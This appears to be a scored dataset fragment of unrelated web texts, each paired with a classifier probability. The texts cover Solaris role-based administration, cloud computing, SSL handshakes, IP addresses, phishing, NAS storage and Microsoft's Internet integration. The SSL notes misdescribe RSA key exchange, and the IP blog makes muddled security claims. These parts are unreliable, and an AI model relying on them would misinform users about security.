        "text": "|Skip Navigation Links| |Exit Print View| |Trusted Extensions User's Guide Oracle Solaris 11 Information Library| In contrast to traditional UNIX systems, superuser (the root user) is not used to administer Trusted Extensions. Rather, administrative roles with discrete capabilities administer the system. In this way, no single user can compromise a system's security. A role is a special user account that provides access to certain applications with the rights that are necessary for performing the specific tasks. Rights include labels, authorizations, privileges, and effective UIDs/GIDs. The following security practices are enforced on a system that is configured with Trusted Extensions: You are granted access to applications and authorizations on a need-to-use basis. You can perform functions that override security policy only if you are granted special authorizations or special privileges by administrators. System administration duties are divided among multiple roles. In Trusted Extensions, you can access only those programs that you need to do your job. As in the Oracle Solaris OS, an administrator provides access by assigning one or more rights profiles to your account. A rights profile is a special collection of programs and security attributes. These security attributes enable successful use of the program that is in the rights profile. The Oracle Solaris OS provides security attributes such as privileges and authorizations. Trusted Extensions provides labels. Any of these attributes, if missing, can prevent use of the program or parts of the program. For example, a rights profile might include an authorization that enables you to read a database. A rights profile with different security attributes might be required for you to modify the database or read information that is classified as Confidential. The use of rights profiles that contain programs with associated security attributes helps prevent users from misusing programs and from damaging data on the system. If you need to perform tasks that override the security policy, the administrator can assign to you a rights profile that contains the necessary security attributes. If you are prevented from running a certain task, check with your administrator. You might be missing required security attributes. In addition, the administrator might assign you a profile shell as your login shell. A profile shell is a special version of a common shell that provides access to a particular set of applications and capabilities. Profile shells are a feature of the Oracle Solaris OS. For details, see the pfexec(1) man page. Note - If you try to run a program and receive a Not Found error message or if you try to run a command and receive a Not in Profile error message, you might not be permitted to use this program. Check with your security administrator. Trusted Extensions recommends the use of roles for administration. Make sure that you know who is performing which set of duties at your site. The following are common roles: root role – Is used primarily to prevent direct login by superuser. Security Administrator role – Performs security-relevant tasks, such as authorizing device allocation, assigning rights profiles, and evaluating software programs. System Administrator role – Performs standard system management tasks, such as creating users, setting up home directories, and installing software programs. Operator role – Performs system backups, manages printers, and mounts removable media.",
        "prob": "tensor([[0.0252, 0.9748]])"
    },
    {
        "text": "Cloud computing is either a revolutionary IT management tool or a nebulous puff of marketing hype, depending on whom you ask. For now, we’re thinking it’s puffery—but intriguing developments are under way. A Cloudy Concept Rather than house your own IT servers or rent the maximum processing and storage capacity you’ll ever need, why not pay only for what you use, when you use it? That’s the basic idea behind cloud computing—and it’s an alluring possibility for many reasons, not least the desire to contain costs and reduce energy consumption. But it turns out that much of the appeal is based on a murky understanding of the concept. According to research by Gartner group vice president Mark McDonald, the percentage of CIOs interested in cloud computing has grown considerably, from 5% in 2009 to 37% earlier this year. And the bigger the company, the more likely management is to say that cloud computing is a top-five IT priority. Interest in Cloud Computing But three out of four respondents who profess interest in cloud computing report little to none in three of the key technologies it entails: server virtualization, service-oriented architecture, and software as a service. Further, nearly half the respondents equate cloud computing with virtualization alone, which shows that many executives have an incomplete view of it. Cloud computing has rapidly risen to what McDonald calls “the peak of inflated expectations.” And where is it headed next? The “trough of disillusionment,” he says. That’s because few people can even seem to agree on what cloud computing is, never mind how on earth it should work. The National Institute of Standards and Technology (NIST) IT laboratory’s definition, version 15, is more than 760 words long and includes five characteristics, three service models, four deployment models, and a disclaimer saying, in essence, that the definition will change again soon. Is the Cloud Greener? Despite all the confusion about cloud computing, the IT laboratory at NIST lays out some figures that make a compelling environmental case for it. According to one NIST presentation, the number of servers in traditional data centers in the U.S. doubled from 2001 to 2006. Power consumption per server quadrupled in the same time period, even though servers typically operate at only 15% of capacity.",
        "prob": "tensor([[0.0075, 0.9925]])"
    },
    {
        "text": "Secure Sockets Layer (SSL) In Depth This week we’ve brought back Dave Hutchieson – with his Scottish accent and technical expertise. To share with us details of how SSL works. This is fairly detailed subject – you’ll need the show notes graphics and links to help understand all the details. Thanks do Dave for his time in researching this subject and sharing his expertise with the rest of us. Warning! – This is going to get pretty detailed. You might want to listen multiple times. Symmetric Keys, Public Keys, Private Keys, Certificates and Hashing Secure Sockets Layer or SSL Part 1 Historical Background In order to get the most from this audiocast, a basic knowledge of symmetric key encryption, public and private key mechanisms, digital certificates and hashing functions is assumed. If this is new material to anyone, or you feel you need a review, please refer to the tutorial weblink included in the show notes. A ladder diagram showing the step by step processes involved in SSL is also provided in the show notes. It is suggested that this diagram be referred to whilst the audiocast is in progress. Wireless Security is one of the most complex topics imagineable. One of the biggest problems is the number of acronyms and abbreviations that are in use. There are a number of security mechanisms in use such as EAP-TLS, EAP-TTLS,EAP- PEAP, EAP-FAST etc etc. It would be nice if there was a common root that could be studied in order to get a foundation for how some of them work. One common type is EAP-TLS. EAP-TLS has it’s roots in TLS or Transport Layer Security. Transport Layer Security in turn, has it’s roots in SSL or Secure Sockets Layer. I have found that if you have a good understanding of how SSL works, that can provide a stepping stone to understanding many of the more complex wireless security methods such as PEAP. In this audiocast, we shall look at the SSL protocol in detail. SSL is not only used as a basis for several wireless security protocols but is also used in HTTPS [ Hypertext Transfer Protocol Secure ] which is often used for managing access points in a secure manner. There are support materials provided in the show notes section, and these have diagrams which may be viewed to accompany the audio portion. SSL is a very complex protocol and due to time constraints, we will not be able to discuss all the details that are involved. However, it is hoped that by the end of the audiocast, and with the support of the show notes, that you should have a good foundation for further study. In a future audiocast, we shall look at how TLS was developed from SSL and how EAP-TLS was developed from TLS. Imagine that you are on holiday and are looking out at the countryside. You decide that there are a number of different places that you want to visit on the landscape. You use a paper map to navigate around the landscape. In the early 80’s, an English scientist, Tim Berners-Lee developed the foundation of the world wide web. However, it was a young student called Marc Andreessen from the University of Illinois who developed the first commercial browser. This browser allowed us to navigate from place to place on the electronic landscape. Thus, his browser allowed you to navigate the electronic network landscape or netscape. Thus, the term Netscape Navigator came into being. It wasn’t long before the commercial aspects of the Internet began to be developed. Companies sprouted up all over the place trying to sell goods and services to people. There was a major problem, however, and that was the issue of security. If someone wanted to buy something, that would probably mean that they would have to provide their credit card number over an open line. A method of hiding that number from prying eyes had to be developed. The issue of confidentiality or privacy had to be covered. There was also the problem of having confidence that the company that you are going to buy something from was actually that company and not an imposter. The issue of authentication had to be covered. It was from this background that the Secure Sockets Layer or SSL was developed. Part 2 SSL Overview SSL was designed to work on top of a secure transport layer protocol, such as TCP or Transmission Control Protocol. We can get a clue about this from the use of the term “sockets” in the phrase SSL. The designers wanted SSL to accomplish three main goals: 1. To provide privacy of information 2. To provide authentication [ although as we shall see later, this is not always mutual authentication ]. 3. To provide a method of message integrity which would allow us to detect if a message had been tampered with on-route from the sender to the destination. The SSL protocol has two layers which sit on top of a reliable transport protocol. In our discussion, we shall assume that protocol is TCP. The uppermost layer comprises three sub-protocols: 1. The SSL Handshake Protocol 2. The SSL Change Cipher Spec Protocol 3. The SSL Alert Protocol. The lowermost layer comprises the SSL Record Protocol The SSL Record Protocol performs a number of functions. Firstly, it takes the application data and divides it into a number of fragments when necessary. The fragment size should be no more than 16,384 bytes in length. The specification says that we can compress these fragments. This is rarely if ever carried out in practice due to compression usually having occurred further up the protocol stack. A Message Authentication Code is then added to each fragment. Each fragment is now encrypted and an SSL header is added. The secure, integrity enabled fragments are now passed onto the transport layer. We will see later how we obtain the keys used for the actual encryption process. Part 3 SSL In Detail We shall now look at the three uppermost protocols, the Change Cipher Spec Protocol, the Alert Protocol and the Handshake Protocol. The Change Cipher Spec Protocol The Change Cipher Spec Protocol allows us to change from one encryption state to another in an organized manner. We shall see more of this later. The Alert Protocol The Alert Protocol allows warning messages to be passed between the two parties. For example, if an incorrect Message Authentication Code is received, an alert protocol message would be sent from one party to the other. The Handshake Protocol The handshake protocol is the meat of the entire system, and is the most crucial component for TLS and EAP-TLS. Imagine that you are a police officer and your lieutenant tells you that you have to go over to the United Nations to talk to a UN security officer about a very important matter. The officer will be waiting for you at the entrance. Upon arrival, you walk up to him and say “Hello”. He looks at you with puzzled eyes. You realize that your boss has not told you what language he speaks. You say “Guten Tag”. No reponse. You say “Bonjour” no response. You finally say “Buenos Dias”. His eyes light up and he says “Ah, Buenos Dias, como esta usted ?” You shake hands. You show each other your ID badges and start talking. In social situations, we don’t usually just walk up to someone and start talking. We usually say hello and shake hands. Sometimes we need to establish a common language. So it is with SSL. Instead of just starting to communicate, hellos need to be said and handshakes need to take place. There are four main phases to SSL: 3. Key Exchange 4. Ongoing communications Let’s look at each phase now. During the negotiation phase, the client and server introduce each other, and decide which encryption, authentication and compression protocols will be used. It should be noted that even though the capability for compression exists in the SSL specification, it is rarely, if ever used. In the authentication phase, the server proves itself to the client via a digital certificate. The server may also ask the client to prove itself via a digital certificate. It should be noted that in the case of Internet shopping, this is rarely, if ever done. In the key exchange phase, a key is exchanged which will be used in creating a master key for encrypted communications. There are several methods by which this can be done, including the Diffie-Hellman method, which I shall discuss in a future audiocast. For now, we shall only discuss what is called the RSA method. Firstly, the client randomly generates a key called the pre-master secret key [ or PMSK ] by means of a method that will be covered when we discuss SSL in detail a little later on. Firstly, the client encrypts the PMSK with it’s own private key. This allows the server [ who has a copy of the client’s public key ] to authenticate that the PMSK did indeed come from the client. The whole assembly [ that is the PMSK encrypted with the client’s private key ] is now encrypted with the server’s public key [ which came via the server’s certificate ] and sent to the server. The server decrypts the package with it’s own private key. This now leaves the original PMSK which has been encrypted with the client’s private key. The server decrypts this package with the client’s public key and hence authenticates the original PMSK. This original key is not the final key in the process, but is used along with some other items to create the final symmetric key, also known as the master key. From the master key, session keys can be derived. Now that both sides have the symmetric or master key, they can exchange messages in an encrypted manner. Digital signatures can also be provided to help ensure authentication and message integrity. Now we are now ready to discuss the detailed step by step operation of the SSL handshake protocol. Step 1. Client Hello This message begins the entire process. The Client_Hello message is sent from the Client to the Server. There are four main things that are included in the message: 1. A random number called ClientHello.Random. This random number will be used to create a key later on in the process. The random number consists of a 32 bit timestamp along with 28 bytes created by a random number generator. 2. A list of cyphersuites and compression methods that the client supports. 3. The highest version of SSL that the client supports 4. A session identifier that indicates whether the client wishes to establish a new connection on the current session or establish a new connection on a new session The session identifier is useful for “going back” to previous webpages for example. So what is a cyphersuite ? A cyphersuite consists of a listing of encryption methods, certificates and integrity checking methods. The client cannot just simply say “I am going to use this value of encryption, this certificate and this integrity checking method”. It has to check with the server to see if the server is actually capable of using any of the methods. Step 2. Server Hello The Server Hello message is sent from the server to the client. There are four main things that the message contains: 1. A random number called ServerHello.Random. This number will also be used to create a key later on in the process. 2. The cyphersuite that the server wishes to use, chosen from the list supplied by the client 3. The lowest common value of the version given by the client and the highest that the server supports. For example, if the client suggested 2.0 and the server supports up to 3.0, the 2.0 version would be used. 4. A session ID number. This number uniquely identifies the current session and helps with security. The Cipher Suite is made up two main parts: A. The Key Exchange Method. That is, how the keys will be exchanged. For example, this could be the RSA method, Diffie-Hellman method, etc. B. The CipherSpec itself, which has fields which tell us the algorithm being used [ for example RC4, DES etc ], the MAC Algorithm [ for example MD 5 or SHA-1 ] the Cipher Type [ for example stream cipher or block cipher ] the HashSize [ for example up to 16 bytes for MD5 and up to 20 bytes for SHA-1 ] Up to this point, unique random numbers have been exchanged, an encryption method has been agreed to, and a unique session identifying number called the “session ID” has been generated. Step 3. Server Cerificate At this point, the server sends the client it’s digital certificate. This point is very important, as not only will the client use a key provided in the certificate to encrypt messages back to the server, but the certificate provides proof that the server is what it says it is, and not an impostor. The client will have previously been provided with a public key from the certification authority. This authority could be a reputable organization such as Verisign for example. At this stage, we have to carefully distinguish between the two public keys mentioned: The first public key has been provided by the certificate authority, that is, an independent certifier, who basically says: “If you can validate the certificate that you have just received from your server using the public key that I provided to you, you can be certain that the server is who he says he is” Once the certificate has been verified, the client extracts the server’s public key from the certificate. This key is very important. Any messages encrypted with this key can only be decrypted by the server using it’s own private key. Step 4 Server Key Exchange A server-key-exchange message may be sent in this step. Only some systems require this. In our example of using regular RSA, we do not require this step. Step 5 Client Certificate Request In this step, the server may request a certificate from the client via a certificate_request_message. This message has two areas of interest. Firstly a certificate type parameter. The certificate type would cover RSA or Diffie-Hellman for example. The second item concerns certificate authorities. This would give a list of the distinguished names of certificate authorities whom the server deems to be “reliable”. Step 6 Server Hello Done At this point, the Server Hello Done Message is sent from the server to the client. This is the end of the first phase of the proctocol exchange. Hello messages have been sent from the client and server. An encryption method and other security parameters have been agreed to. The client has it’s own random number and that of the server. The server has it’s own random number and that of the client. A certificate has been sent from the server to the client, and possibly one from the client to the server. The public key of the server has been extracted from the server’s certificate, ready for use in the second phase. A point to note: there are no formal first and second phases in the TLS specification. I have simply broken up the process into two parts in order to, hopefully, make the process easier to undertstand. In a future audiocast, I’ll be covering another EAP method which does have two officially defined phases. Step 7 Client Certificate In this step, if the server has requested a certificate, then the client will send one. In the classic case of SSL being used in HTTPS for internet transactions with say an on-line clothing company, the customer or client would not normally have to provide any formal identification with the exception of say a credit card number. This is obviously somewhat a problem , as it means that fraud could and in fact does occur. Step 8 Client Key Exchange In common with many other security protocols, a true master secret key is not sent between the two parties. Instead, a key called the pre-master secret is created and sent from the client to the server. This pre-master secret will then be used at both ends of the link to create a master secret key. A random number is generated at the client and this number is referred to as the pre-master secret key or PMSK Firstly, the client encrypts the PMSK with it’s own private key. This private key is known only to the client. This allows the server [ who has a copy of the client’s public key ] to authenticate that the PMSK did indeed come from the client. The whole assembly [ that is the PMSK encrypted with the client’s private key ] is now encrypted with the server’s public key [ which came via the server’s certificate ] and sent to the server via a client_key_exchange message. The server decrypts the package with it’s own private key. The server’s private key should be known only to the server. This now leaves the original PMSK which has been encrypted with the client’s private key. The server decrypts this package with the client’s public key and hence authenticates the original PMSK. At this stage, both sides have the pre-master secret key. In the next part, the actual or master secret key will be calculated at both ends of the link. The master secret is calculated using a complex hash function involving the pre-master secret, the ClientHello.Random and the ServerHello.Random variables or nonces that were described earlier. The master key is 48 bytes in length. From the master key, a number of other keys are derived. These keys are used for encrypting data sent by the server, for MAC operations performed by the server, for encrypting data sent by the client and for MAC operations performed by the client. Initialization Vector values are produced for the situation in which block ciphers in CBC mode are used. Step 9 Client Certificate Verification A certificate_verify message is sent if the client previously provided a certificate to the server. This message is only used with certificates that have signing capabilities. Step 10 Change Cipher Spec It should be noted that the Change Cipher Spec protocol is a separate protocol from the handshake protocol. It has been included here due to it’s critical function within the handshake protocol itself. SSL keeps a record of two states called the current state and the pending state. We can think of these two states as “Conditions that are happening now” and “Conditions that will happen later”. When SSL is first initialized, both states are zero. Once the master key is established, that key is used for a pending state. Both sides end up with a pending encryption process waiting in the wings so to speak. The pending Cipherspec is copied into the current Cipherspec. We just need some form of agreement between both ends as to when to begin implementing the encryption. This occurs in the next step. Step 11 Finished The finished message is used to tell the other end that the key exchange and authentication procedures were successful. This message is encrypted with one of the newly produced keys, and authenticated as well. Once the server receives the encrypted finished message from the client, it is able to send it’s own change_cipher_spec and finished messages in steps 12 and 13 of the process. Finally we are able to encrypt any data that needs to be sent from either party. That was quite a lot of material, but the core of the whole process [ as for many other security protocols ] consists of : Negotiation, Authentication, Key Exchange and Ongoing Communications In the show notes section, I have included an interesting trace of a client to server communication process I hope that this audiocast was useful, and thank you for listening. We’d love to have you subscribe to our RSS feed – just click the button in the upper right corner of the web page. Until next week, thanks for listening! If you have any feedback on the show – please drop an e-mail to feedback@WirelessLANProfessionals.com.",
        "prob": "tensor([[0.0183, 0.9817]])"
    },
    {
        "text": "- Category: Technology Featured - Published on Wednesday, 15 August 2012 02:08 - Written by Raja Computers especially connected with the internet, the users came to know about a popular word ‘IP’. Outside the computer world IP refers to Intellectual Property; but in our world IP refers to Internet Protocol. You may come across it most of the time on TCP / IP. The TCP refers to Transmission Control Protocol. TCP / IP is generally refers to two computers exchanging data between them. On the internet, every computer (email servers, IP hosts) gets an IP address. Let us take an example. Some organizations send letters. If undelivered they can be returned to them in the address mentioned by them. In the Internet world IP address is doing the same thing apart from other things. IP address consists of four arrays of numbers. For example 184.108.40.206 is an IP address, if you’re sending a data this address is just like a postal stamp attached to your letter. It will reach its destination. From this you can find, from which country, which internet service provider and from which computer this data or email is sent. Some routers and software packages are changing their IP address while sending which should be avoided. If not, using them anybody can access your computer without your permission. It means they can steal the important information, data, your bank account number, credit and debit card numbers, and your passwords easily. These Software or packages are called as Malwares and the IP hacker use Proxies to get your data. They can also use your computer’s IP as a Proxy if you got hacked. There are several Anti Spyware & Malware Programs available in the market to prevent them. Some hackers can use or take control over your computer’s IP address and send their data through it. It will facilitate your IP being abused by other undesirable elements. On the Internet; the Internet Service Providers will allocate IP address for standard computer servers and for standard organizations (that runs computer servers regularly or on daily basis with their clients, consumers, customers, and employees) will be given standard IP address. Otherwise all the computers we are using in our homes, and though our mobiles, tablets, smartphones, and broadband landlines are connected through the Internet Service Provider and get a random IP address. Each time when you are connected to the internet, you get a new IP address. Please bear in mind that can also be easily hacked by the persons over the internet. You have to keep it safe because, last year the scams based on IP addresses is increased by 450% as reported by Symantec. Some hackers are connecting all the computer IP addresses they hacked into a network and using them for their scamming and sending mails for threatening purposes. So, you have to keep your IP address safe. You can do that simply by using Anti-Virus Programs and updating Firewalls regularly on your computer. blog comments powered by Disqus",
        "prob": "tensor([[0.3977, 0.6023]])"
    },
    {
        "text": "Snopes.com defines phishing as \"a term which refers to the online imitation of a company's branding in spoofed e-mail messages and web sites, created with the intent of fooling unsuspecting users into divulging personal information such as passwords, credit card numbers, PINs, etc. A typical \"phish\" e-mail will appear to come from a financial institution (such as a bank or credit card company), informing the recipient that some type of problem has affected his account and directing him to follow a provided hyperlink to clear up the problem. The hyperlink leads not to a legitimate site, however, but to a server (usually in another country) on which an imitation web site has been set up. The fooled customer is then prompted to enter confidential personal information (collected by the scammers for perpetrating) identify theft and (usually) redirected to a legitimate web site to obscure the fact that he just gave away data to crooks.\" Phishing sites can also include malicious elements that are intended to take advantage of web browser vulnerabilities. Even if you don't enter personal information on the spoofed web site, you could be putting your computer's security in danger simply by clicking on the link in the spoofed message. The best way to protect yourself from phishing scams is to never click on the link in an unexpected or suspicious message you receive. The Internet has made the world a much smaller place. While its benefits are tremendous, connecting us to others and to volumes of instant information on any subject anywhere in the world, its downside includes dark alleys frequented by criminals intent on harming you, your computer, and/or your information. In the physical world, it used to be that you knew which dark alleys or bad neighborhoods to avoid. Today the Internet, with all its benefits, has also brought the dark alleyways to your computer. As such, it takes much more vigilance to protect yourself and your computer from would-be criminals. Some of the risks you encounter simply by surfing the Internet include, but are not limited to: Identity Theft, viruses and worms that infect your computer, spamming, and spyware infections. Content provided by CU Boulder",
        "prob": "tensor([[2.0452e-06, 1.0000e+00]])"
    },
    {
        "text": "The School of Earth and Space Exploration (SESE) at Arizona State University (ASU) has deployed more than a petabyte of clustered NAS storage Ernest Bowman-Cisneros, manager, LROC Science Operations Center at SESE, said his team needs to store petabytes of data in a single volume so it can handle the constant flow of images from the moon. His implementation is the type of \"big data\" storage EMC executives have been talking about since completing the $2.25 billion Isilon acquisition last December. SESE switched to Isilon last year as the LRO began sending data back, and after its previous storage setup choked while the team was digitizing images from the Apollo space program. SESE runs two 11-node clusters of Isilon NL-Series storage with just under 700 TB of capacity on each cluster. The primary cluster is used for active data with a secondary cluster serving as a redundant copy stored in a separate site. SESE uses Isilon SyncIQ software to synchronize data between the two clusters. Bowman-Cisneros said SESE has published nearly 100 TB of data from the lunar camera in the first year of the project, and he expects it to generate approximately 170 TB a year from now on – 120 TB of published data plus about 50 TB of other data from the spacecraft. The LRO is expected to remain in orbit between four and nine years. \"We don't need fast I/O performance, but we do need a large storage solution,\" Bowman-Cisneros said. \"One of our biggest storage requirements was that we would be able to grow to multi-petabyte volumes. If we couldn't grow to those large volumes, we would have small pods and we'd have to have a sufficiently high-speed solution to move data from one volume to the next. We couldn't do that with our budget.\" Bowman-Cisneros said before the LRO project, his group began storing data from the Apollo Scan Project undertaken by NASA's Johnson Space Center (JSC) in 2006 to digitize photographs taken from Apollo missions. For the Apollo Scan Project, SESE originally used NetApp storage running redundant Red Hat Global File System (GFS) nodes set up by ASU's high-performance computing (HPC) group. That project gave Bowman-Cisnero's team time to work out any storage problems before the LRO cameras began sending back data beginning in 2010. Six months into the Apollo project, the size of the clusters grew too large for SESE's GFS heads and caused system crashes, Bowman-Cisneros said. One crash lasted a week. \"According to Red Hat, we were running one of the largest back-end clusters to GFS, and we hit the limit of that implementation,\" he said. \"The size of the system and the way the system was being accessed freaked out the GFS heads. At one point, we had multiple heads, but after this [one-week] outage we had to revert to a single node so we could continue operations and not encounter this problem again.\" He said the LRO team never lost data but the crashes caused inconvenient delays. \"That one node tended to lock up if it got very busy, and we'd have to restart it, which caused minor delays in data processing,\" he said. \"If the load got very high on it, it actually took out the file system, lost state with back-end filers, and the storage solution went away and we'd have to wait for it to re-start. So while the solution was working, it suffered from this performance problem and we also needed more storage for the next iteration of processing.\" So after four years with his original storage system, Bowman-Cisneros decided it was time for an upgrade. He said he talked to approximately six NAS vendors, and only Isilon and IBM said they could fulfill the LRO requirements. Isilon pitched its NL-Series and IBM proposed SONAS based on its General Parallel File System (GPFS). Isilon quickly sent out a six-node test system early last December. Bowman-Cisneros said it \"passed with flying colors\" and LRO has had Isilon in full product for approximately a month. \"Isilon was very aggressive getting us equipment and making sure it was set up correctly,\" he said. \"We had a full implementation of their hardware set up in short order to test all our requirements and some of the issues we were having with the old solution.\" He said the only problem he's had with Isilon was a software patch that caused some problems with his secondary node but didn't impact day-to-day performance. Tech support quickly solved the problem and he was able to apply the patch to both systems without problems. Bowman-Cisneros was testing Isilon's system at the same time EMC was negotiating its acquisition of the clustered NAS vendor. \"It wasn't until after we signed on the dotted line that we found out about EMC,\" Bowman-Cisneros said. \"By the end of December, we had completed our testing and decided to go with their system. At this point, [the acquisition has] been inconsequential to us. My only concern is that EMC will continue to develop and support the model I have.\" This article was originally published onSearchStorage.com.",
        "prob": "tensor([[2.1732e-06, 1.0000e+00]])"
    },
    {
        "text": "Internet Standards and Operating Systems - Why Integration Makes Sense In the relatively brief history of personal computers, computer users—both individuals and organizations—have benefited from a staggering rate of growth in new capabilities, and improvements in old capabilities. We've seen PCs evolve from slow, silent, unattractive, standalone machines that couldn't even store a single 10-page document into easy-to-use machines that can play movies, communicate around the world, and manage reams of data at speeds that exceed those of mainframe computers [twenty] years ago. This evolution in capabilities has arisen out of many individual innovations and the standardization of such innovations, which sets the stage for the next round of innovation to occur. On This Page A Beneficial Cycle: Innovations Become Standard Capabilities Internet Standards – The Next Great Enabling Technology Internet Technologies in Windows - Making it Easier for Software Vendors Platform Services - Doesn't integration harm other peoples' businesses? A Beneficial Cycle: Innovations Become Standard Capabilities One of the primary roles of an operating system—perhaps its most important—is to provide a common platform of services for 3rd parties to create new applications, hardware devices, etc. Operating systems have always done this, and over time each operating system has made its platform of services broader and more capable. Windows is no exception. In the beginning, Windows had a fairly limited set of services; Windows-based applications couldn't ask Windows to do very much for them—they couldn't ask the operating system to get files from any kind of network, they couldn't ask it to draw very many interesting things on the screen, they couldn't even ask it to play a sound. But, by continually adding new capabilities to Windows, Microsoft has made it easy for application vendors to create more capable applications with features that make them more appealing to consumers. Often, new capabilities added to Windows started out as innovations created by other parties—and sometimes they have been developed within Microsoft. With a thriving and competitive software industry, anyone can create a new and useful element using the platform of services that comprises Windows, and including some of these in the operating system makes them available for everyone to share. The beneficial cycle, over time, moves the most generally useful capabilities into the operating system, enhancing the user experience and paving the way for further innovations that will make the whole experience of using PCs better. Let's look at a couple of examplesU. Six years ago a \"toolbar\" was an uncommon thing in an application window. The first application to ever create a toolbar—the row of buttons that make it easy to perform common operations like \"open\" and \"save\"—was Microsoft Excel. When Microsoft Excel created the first toolbar, the developers wrote all the computer-code for the toolbar on their own. This was a lot of work, but it turned out that users liked toolbars very much, so the effort was worth it for the Excel team. If any other application wanted to include a toolbar as well, they'd have to do all of that same work on their own. Over time, lots of people at lots of companies spent a great deal of time writing toolbars. Across the industry, this was an inefficiency. Effort was duplicated from team to team, and even worse, when two different applications with two different toolbars were running on a given PC, two separate sets of computer code were executing simultaneously on the machine to generate those toolbars, making the PC run more slowly. Eventually, toolbars became so common that it made sense for Windows itself to provide a single facility for generating toolbars that everyone could use. When Windows 95 shipped, that was one of many new services the operating system offered to any application developer. The result—more applications than ever now have toolbars, and all the toolbars work well and in a consistent manner across applications. Because all of those toolbars are generated by the same set of computer code, PCs run faster. And perhaps the greatest benefit is that hundreds of software development teams around the world are now able to spend their time on new innovations instead of implementing the computer-code for yet another toolbar. Can you remember when you bought a PC and it had no sound capabilities? Well, that wasn't really very long ago. Basic PCs often didn't come with sound cards, and no standard software existed that application developers could rely on to produce sounds. Any application that wanted to use sounds had to create a team of people to go write all the computer code associated with understanding whether the PC had a sound card, figuring out what kind it was, and playing sounds on it. This was a major task. Different sound cards had different capabilities, and it took a lot of work to get right all the computer code needed to handle each and every possible configuration of a user's PC. Developers of individual applications were even forced to make sure to provide things like volume controls, since nothing like that was standard in the PC environment. Over time, sound cards gained popularity, and application vendors were repeatedly required to duplicate the work necessary to incorporate sound into their applications. At that point, it made sense to integrate sound support into the operating system (including both these application services and end-user features like a sound-player and CD-player). Today, many Windows-based applications use sound, relying on Windows to handle the housekeeping chores inherent in providing sound for them. It's become quite routine, really. Think about all the games you use, the CD-ROM titles you play, even the web-browsing software you run has sound capabilities built-in. This has happened because application developers now longer have no write lots of computer code themselves in order to incorporate sound into their products. Instead, all they need to do is say \"Windows—can you play this sound for me?\" and the rest is taken care of. Once again, the knowledge that the platform of services that comprises Windows includes such capabilities frees software developers to spend their time improving unique aspects of their products. Internet Standards – The Next Great Enabling Technology You're undoubtedly reading this because you're interested in the debate surrounding Microsoft's integration of Internet technologies into Windows. Is this the right thing for Microsoft to do? Does it benefit or harm the PC industry? And what will the effect be on consumers who actually use PCs? Emergence of Internet Standards For quite a few years a group of people known as the \"IETF\" (Internet Engineering Task Force) has been developing a set of standard methods for people and computer applications to communicate with each other across the Internet and other similar networks. These folks aren't from any one company, they represent lots of different interests, and their goal has been to specify technologies and protocols that anyone can use. Numerous products now take advantage of these Internet standards. Of course, that includes the web-browsing software, but there are lots of others products as well—email packages, things like the Pointcast screensaver and even custom applications that businesses use to communicate or conduct commerce. You might be surprised to learn that even Microsoft Office 97 relies on Internet standards to allow you to save Office documents to a certain type of Internet server. In fact, the set of standards created and managed by the IETF and the Worldwide Web Consortium (W3C) is quite broad and covers more than just network-related stuff. It's worth understanding what some of these standards are about. HTML – a universal file format. HTML (\"Hypertext Markup Language\") is an English-like language that people can use to describe the way text, images, videos and sounds should be displayed on a computer screen. When you visit a web page, the screen you're seeing was written in HTML. Once this standard file format was created, it's become possible to create documents or screen displays that can be viewed in any application or on any computer that supports the standard. HTML is a very powerful screen-description language, and it's becoming more widespread even in applications that have no necessary connection to the Internet. HTTP/FTP (etc.) – universal ways of moving data or files across a network. HTTP (\"Hypertext Transfer Protocol\"), FTP (\"File Transfer Protocol\") and similar network protocols describe standard ways that anybody can get a file from this computer to that one across a network. These protocols are used on the Internet, but they are also used on corporate intranets and other types of networks. URL – a universal address for files on the Internet. Anytime you see text in the format www.microsoft.com, you're looking at a URL (\"Uniform Resource Locator\"). This is simply a way to uniquely describe the location of a file that lives on the Internet, which is comprised of information stored on a large number of computers around the world. Without such unique addresses, it would be impossible to locate particular files on the Internet. The goal of the IETF/W3C in creating these standards has been to enable and encourage universal exchange of information. Any application is allowed (even encouraged) to read and display HTML files. And as more applications do this, life becomes easier for both users and application developers—it becomes easier for people to exchange information. (If you're developing an application that creates HTML files, you know that lots of people will be able to read them, for example.) An important thing to understand about the Internet standards committees, however, is that their job is to decide on the standards but not actually to write the computer code that implements the standards in software products. When the W3C creates the next version of the HTML standard, for example, they do it by writing a lengthy specification document, not by writing any actual computer code that draws HTML on the screen or that edits HTML documents. The task of writing the computer code is left to teams of software developers in individual companies or universities, etc. The situation is a lot like the one that prevailed after the Microsoft Excel team designed the first toolbar—the W3C designs a great way for applications to universally exchange information, but each application vendor still needs to write the computer code to permit such information exchange to work in their application. Back between 1993 and 1996, lots and lots of companies were separately writing the same computer code to support all the standards created by the IETF/W3C—code to read and display HTML, code to get files from computers on the Internet, code to locate files using their URLs. This involved (and still does) a major duplication of effort, and a lot of work for individual application vendors. Internet Technologies in Windows - Making it Easier for Software Vendors From the very outset, Microsoft intended Windows 95 to support the broadest possible range of networks, including the Internet. That is why the development of Windows 95, code-named \"Chicago\", included work on a variety of Internet-related technologies, code-named \"O'Hare\"—a point of departure to distant places from Chicago. These technologies were later referred to by the name \"Internet Explorer\", and Internet Explorer 1.0 was an integrated element of the first version of Windows 95 provided to computer manufacturers, 2 ½ years ago. In 1996, Microsoft created \"Internet Explorer 3.0,\" a greatly improved set of Internet-related technologies which are built-in to every version of Windows. You may regard \"Internet Explorer\" as just a web browser application, but that would be quite an inaccurate way to think of it. In fact, \"Internet Explorer\" describes two things: A set of platform technologies that any software vendor can use to make their application support Internet standards. A user-interface that any consumer can use to view web-sites on the Internet or any other internet-standards-based network. The first of these two things—the platform technologies—work just like the support for toolbars that Microsoft made a native part of Windows that anyone could use. Instead of requiring every separate software developer to assign a team of people the task of implementing computer code for handling Internet standards, Microsoft has written the code once and made it possible for anyone to use it. It's worth pointing out the significance of this statement. When Microsoft developers wrote the computer code that provides Internet Explorer functionality, they set out to design and build a set of operating system services. This is very unlike Netscape Navigator, which is a free-standing application that does not provide a broad set of operating system services to 3rd party software developers. In fact, every single pixel you see on the screen when you use the Internet Explorer browsing window was put there by operating system services that any vendor creating Windows-based applications can use. That is a huge efficiency and enables software developers to focus their energies on adding attractive new features to their products rather than focusing on the low-level plumbing required to handle Internet standards. There are lots of examples already of applications using these platform services – even Windows itself relies on some of them to provide services to computer users. Let's look at three examples: HTML Help. Today, the majority of applications written for Windows include \"help\" files along with their application. Most users expect this, so it's work that application developers need to do before they can market their products. Up until now, application vendors created their \"help\" files using a service of Windows known as \"Winhelp\". The Winhelp system included a set of tools for software developers to author \"help\" files keyed to their particular application. After those specialized \"help\" files were created 